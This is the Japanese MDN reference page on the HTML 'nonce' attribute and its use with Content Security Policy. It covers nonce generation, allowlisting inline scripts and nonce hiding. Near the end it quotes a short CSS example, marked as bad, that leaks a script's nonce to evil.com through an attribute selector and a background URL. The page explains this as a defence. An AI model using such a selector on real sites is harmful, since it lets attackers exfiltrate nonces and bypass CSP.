---
title: nonce
slug: Web/HTML/Global_attributes/nonce
l10n:
  sourceCommit: ba96f2f183353872db6d9242c7d2dffe2dbc0c35
---

{{HTMLSidebar("Global_attributes")}}

**`nonce`** [グローバル属性](/ja/docs/Web/HTML/Global_attributes)は、
これは暗号化ノンス ("number used once") を定義するコンテンツ属性で、[コンテンツセキュリティポリシー](/ja/docs/Web/HTTP/CSP) が指定された要素に対してフェッチの実行を許可するかどうかを決定するために使用することができます。

## 解説

`nonce` 属性は、特定の要素、例えば特定のインラインスクリプトやスタイル要素を許可リスト化するのに有益なものです。
[CSP](/ja/docs/Web/HTTP/CSP) の `unsafe-inline` ディレクティブの使用を避けることができ、すべてのインラインスクリプトまたはスタイルを許可リスト化することができます。

> [!NOTE]
> 安全でないインラインのスクリプトや スタイルのコンテンツを使用しない方法がない場合のみ、 `nonce` を使用してください。もし `nonce` が必要ないのであれば、使用しないでください。スクリプトが静的なものであれば、代わりに CSP ハッシュを使用することもできます。
> （[安全でないインラインスクリプト](/ja/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#unsafe_inline_script)の使用上の注意を参照してください。）
> 常に [CSP](/ja/docs/Web/HTTP/CSP) の保護を最大限に活用し、ノンスや安全でないインラインスクリプトを可能な限り避けるようにしてください。

### \<script> 要素を許可リスト化するためにノンスを使用

ノンス機構を使用したインラインスクリプトを許可するためには、いくつかの手順があります。

#### 値の生成

ウェブサーバーから、暗号的に安全な乱数発生器を用いて、少なくとも 128 ビットのデータをランダムに Base64 エンコードした文字列を生成します。ノンスはページを読み込むたびに違った形で生成する必要があります（ノンスは 1 回だけ）。例えば node.js で、次のように行います。

```js
const crypto = require("crypto");
crypto.randomBytes(16).toString("base64");
// '8IBTHwOdqNKAWeKl7plt8g=='
```

#### インラインスクリプトの許可リスト化

バックエンドのコードで生成されたノンスは、これで許可リストにしたいインラインスクリプトに使用されます。

```html
<script nonce="8IBTHwOdqNKAWeKl7plt8g==">
  // …
</script>
```

#### ノンス付きの CSP ヘッダーの送信

最後に、ノンスの値を [`Content-Security-Policy`](/ja/docs/Web/HTTP/Headers/Content-Security-Policy) ヘッダーで送る必要があります（`nonce-` を前に付ける）。

```http
Content-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='
```

### ノンスへのアクセスとノンスの隠蔽

セキュリティ上の理由から、コンテンツ属性 `nonce` は隠蔽されます（空文字列が返されます）。

```js example-bad
script.getAttribute("nonce"); // 空文字列を返す
```

[`nonce`](/ja/docs/Web/API/HTMLElement/nonce) プロパティは、ノンスにアクセスするための唯一の方法です。

```js example-good
script.nonce; // ノンスの値を返す
```

ノンスの隠蔽は、このようにコンテンツ属性からデータを取得するメカニズムによって、攻撃者がノンスデータを流出させることを防ぐのに役立ちます。

```css example-bad
script[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## 仕様書

{{Specifications}}

## ブラウザーの互換性

{{Compat}}

## 関連情報

- [`HTMLElement.nonce`](/ja/docs/Web/API/HTMLElement/nonce)
- [コンテンツセキュリティポリシー](/ja/docs/Web/HTTP/CSP)
- CSP: [`script-src`](/ja/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)
